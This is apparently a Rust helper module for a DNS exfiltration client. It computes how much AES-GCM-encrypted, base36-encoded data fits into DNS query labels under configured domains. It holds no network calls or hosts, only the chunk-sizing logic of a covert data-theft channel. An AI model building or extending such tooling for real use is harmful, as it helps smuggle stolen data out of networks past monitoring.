//! Shared DNS framing limits and helpers for the exfil client.

pub const DNS_MAX_NAME: usize = 253;
pub const LABEL_CAP: usize = 62;
pub const FRAME_LABELS: usize = 2;
pub const SESSION_TAG_WIDTH: usize = 3; // "E" + two base36 digits
pub const CHUNK_COUNTER_WIDTH: usize = 5;
pub const FRAME_PREFIX_LEN: usize = 2 + 1 + SESSION_TAG_WIDTH + 1 + CHUNK_COUNTER_WIDTH + 1; // EX-ID-CHUNK-
pub const FRAME_CHAR_BUDGET: usize = LABEL_CAP * FRAME_LABELS;
pub const AES_GCM_OVERHEAD: usize = 28;
const LOG36_OF_2: f64 = 0.193_426_403_617_270_83;
const MAX_CHUNK_PROBE: usize = 512;

/// Maximum number of base36 characters available for payload data inside a frame.
pub fn chunk_payload_budget_chars() -> usize {
    FRAME_CHAR_BUDGET.saturating_sub(FRAME_PREFIX_LEN)
}

/// Estimate the number of base36 characters necessary to encode `bytes`.
pub fn estimate_base36_len(bytes: usize) -> usize {
    if bytes == 0 {
        return 1;
    }
    let bits = (bytes * 8) as f64;
    (bits * LOG36_OF_2).ceil() as usize
}

/// Calculate the encoded length for a plaintext payload after AES-GCM wrapping + base36.
pub fn encoded_len_for_payload(plaintext_len: usize) -> usize {
    let cipher_len = plaintext_len + AES_GCM_OVERHEAD;
    estimate_base36_len(cipher_len)
}

/// Returns true if `chunk_bytes` will fit inside the DNS payload budget.
pub fn chunk_fits_budget(chunk_bytes: usize, payload_budget: usize) -> bool {
    encoded_len_for_payload(chunk_bytes) <= payload_budget
}

fn longest_domain_length(domains: &[&str]) -> usize {
    domains
        .iter()
        .map(|d| d.trim().trim_end_matches('.').len())
        .max()
        .unwrap_or(0)
}

/// Compute the metadata payload budget for the longest configured domain.
pub fn metadata_payload_budget(longest_domain: usize) -> usize {
    let reserved = longest_domain + FRAME_LABELS; // dot separators between labels + domain
    if DNS_MAX_NAME <= reserved || FRAME_CHAR_BUDGET <= FRAME_PREFIX_LEN {
        return 0;
    }
    let by_dns = DNS_MAX_NAME - reserved;
    if by_dns <= FRAME_PREFIX_LEN {
        return 0;
    }
    let allowed = FRAME_CHAR_BUDGET.min(by_dns);
    allowed.saturating_sub(FRAME_PREFIX_LEN)
}

/// Compute the largest safe chunk size (in plaintext bytes) for the provided domains.
pub fn max_supported_chunk_bytes(domains: &[&str]) -> usize {
    let longest = longest_domain_length(domains);
    let payload_budget = metadata_payload_budget(longest);
    if payload_budget == 0 {
        return 0;
    }

    let mut best = 0usize;
    for chunk in 1..=MAX_CHUNK_PROBE {
        if chunk_fits_budget(chunk, payload_budget) {
            best = chunk;
        } else {
            break;
        }
    }
    best
}
